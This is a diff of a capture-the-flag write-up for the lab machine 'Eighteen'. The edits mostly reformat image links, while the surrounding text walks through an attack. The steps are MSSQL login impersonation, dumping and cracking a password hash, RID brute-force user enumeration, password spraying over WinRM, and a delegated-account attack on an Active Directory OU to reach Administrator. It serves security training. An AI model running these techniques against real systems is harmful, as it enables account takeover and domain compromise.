@@ -1,4 +1,3 @@
-
 # Eighteen
 
 **By Stager** | FashilHack
@@ -44,7 +43,7 @@ The three ports that matter:
 5985/tcp  — WinRM (remote PowerShell access)
 ```
 
-![[stager/writeups/write-ups/Eighteen/nmap.png]]
+![](images/nmap.png)
 
 Added the domain to `/etc/hosts` so everything resolves cleanly:
 
@@ -53,7 +52,6 @@ echo "10.129.26.32 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
 ```
 
 A Domain Controller with MSSQL and a web app running alongside WinRM. The first thing to try is whatever credentials we already have.
-
 
 ---
 
@@ -76,7 +74,9 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 
 Returns `kevin` and `0`. Zero means no — we are not sysadmin.
 
-**List all databases on the server:**![[login in with creds given.png]]
+**List all databases on the server:**
+
+![](images/login%20in%20with%20creds%20given.png)
 
 ```sql
 SELECT name FROM master.dbo.sysdatabases;
@@ -92,7 +92,7 @@ SELECT name, type_desc, is_disabled FROM master.sys.server_principals;
 
 Two real SQL logins besides the built-ins: `kevin` and `appdev`. Two accounts means one of them might have more access than the other.
 
-![[finding how many users.png]]
+![](images/finding%20how%20many%20users.png)
 
 **Check impersonation rights:**
 
@@ -102,11 +102,12 @@ SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_princ
 
 This query looks at the permissions table and asks: who has been granted the ability to be impersonated? The result comes back: `appdev`.
 
-![[who can i impersonate.png]]
+![](images/who%20can%20i%20impersonate.png)
+
 This is the key finding. In MSSQL, `EXECUTE AS LOGIN` lets you temporarily become another login and inherit all their permissions — like `sudo` but for SQL identities. Kevin cannot access `financial_planner`, but maybe `appdev` can.
 
 > **Important:** impacket-mssqlclient sends each line to the server separately. Always write multi-line queries as a single line or they will fail with syntax errors.
-![[imporsanated kevin.png]]
+
 ---
 
 ## Step 3 — User Impersonation
@@ -131,7 +132,7 @@ USE financial_planner;
 
 It works. Kevin got an access denied error trying this exact command. Appdev can enter it. That is why impersonation mattered — not for sysadmin access, but to reach data that was locked behind a different account.
 
-![[imporsanated kevin.png]]
+![](images/imporsanated%20kevin.png)
 
 ---
 
@@ -169,7 +170,7 @@ is_admin:      1
 
 The admin account for the web application. The hash format tells us everything: `pbkdf2:sha256:600000` is PBKDF2-SHA256 with 600,000 iterations. High iteration counts are designed to slow down cracking — this will take time on a CPU.
 
-![[dumped users table found creds.png]]
+![](images/dumped%20users%20table%20found%20creds.png)
 
 ---
 
@@ -190,7 +191,7 @@ Convert the hex hash to base64:
 echo '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | xxd -r -p | base64
 ```
 
-![[convert to hash hex to base64.png]]
+![](images/convert%20to%20hash%20hex%20to%20base64.png)
 
 Build the correctly formatted hash file:
 
@@ -206,7 +207,7 @@ hashcat -m 10000 adminhash.txt /usr/share/wordlists/rockyou.txt
 
 **Cracked: `iloveyou1`**
 
-![[hash cracked.png]]
+![](images/hash%20cracked.png)
 
 ---
 
@@ -240,7 +241,7 @@ Save just the real users to a file:
 netexec mssql eighteen.htb -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute | grep -oP 'EIGHTEEN\\\K\w+\.\w+' > users.txt
 ```
 
-![[users found .png]]
+![](images/users%20found%20.png)
 
 ---
 
@@ -248,14 +249,17 @@ netexec mssql eighteen.htb -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-b
 
 We have a cracked password (`iloveyou1`) and a list of seven domain users. Password reuse is one of the most reliable things in penetration testing — people set one password and use it across multiple accounts.
 
-Spraying means trying that one password against every account. The important discipline is doing it against one protocol at a time and not hammering too fast, to avoid triggering account lockouts. WinRM is a clean target because the result is unambiguous — either the account has remote access or it does not:![[passspray.png]]
+Spraying means trying that one password against every account. The important discipline is doing it against one protocol at a time and not hammering too fast, to avoid triggering account lockouts. WinRM is a clean target because the result is unambiguous — either the account has remote access or it does not:
 
 ```bash
 netexec winrm 10.129.26.32 -u users.txt -p 'iloveyou1'
 ```
 
-![[found adam scott pwn3d.png]]
+![](images/passspray.png)
+
 `adam.scott` comes back with `Pwn3d!` — that means this account has WinRM access and the password matches.
+
+![](images/found%20adam%20scott%20pwn3d.png)
 
 ---
 
@@ -265,7 +269,8 @@ netexec winrm 10.129.26.32 -u users.txt -p 'iloveyou1'
 evil-winrm -i 10.129.26.32 -u adam.scott -p 'iloveyou1'
 ```
 
-![[login evil-winrm.png]]
+![](images/login%20evil-winrm.png)
+
 Navigate to the desktop and grab the flag:
 
 ```powershell
@@ -275,7 +280,7 @@ download user.txt
 
 **User flag captured.**
 
-![[stager/writeups/write-ups/Eighteen/user flag.png]]
+![](images/user%20flag.png)
 
 Now enumerate adam.scott's position in the domain — this drives the privilege escalation decision:
 
@@ -285,7 +290,7 @@ net user adam.scott /domain
 
 Global group memberships: `IT` and `Domain Users`. Adam is in the IT group. Earlier during RID bruting we saw IT listed as a custom group on this domain. The machine hint asks what permission IT has over the Staff OU — this is pointing directly at an Active Directory ACL attack.
 
-![[adam is in IT domain users group.png]]
+![](images/adam%20is%20in%20IT%20domain%20users%20group.png)
 
 ---
 
@@ -329,7 +334,7 @@ Import the script — note: dot-sourcing must be run as its own command, not com
 Find-VulnerableOU
 ```
 
-![[can createchild.png]]
+![](images/can%20createchild.png)
 
 Run the full attack chain, specifying Administrator as the account to link to:
 
@@ -351,7 +356,7 @@ The script does everything automatically:
 
 Three things happened: a machine account called `Pwn$` was created with a known password (`Password123!`), a dMSA called `attacker_dMSA$` was created and linked to Administrator, and adam.scott was given full control over the dMSA. Everything is in place.
 
-![[s.png]]
+![](images/s.png)
 
 ### Getting the Ticket — Pending (Clock Skew Issue)
 
@@ -371,7 +376,7 @@ The next step is using impacket's getST to request a Kerberos ticket as `attacke
 
 Tunnel confirmed working — `ss -tlnp | grep 88` showed chisel listening on port 88.
 
-![[chisel tunnel up.png]]
+![](images/chisel%20tunnel%20up.png)
 
 Then request the ticket:
 
@@ -400,10 +405,10 @@ evil-winrm -i 10.129.26.32 -u Administrator -H <NThash>
 
 ## Flags
 
-|Flag|Status|
-|---|---|
-|user.txt|✅ Captured|
-|root.txt|⏳ Pending — Kerberos clock skew on ticket step|
+| Flag     | Status                                          |
+| -------- | ----------------------------------------------- |
+| user.txt | ✅ Captured                                      |
+| root.txt | ⏳ Pending — Kerberos clock skew on ticket step |
 
 ---
 
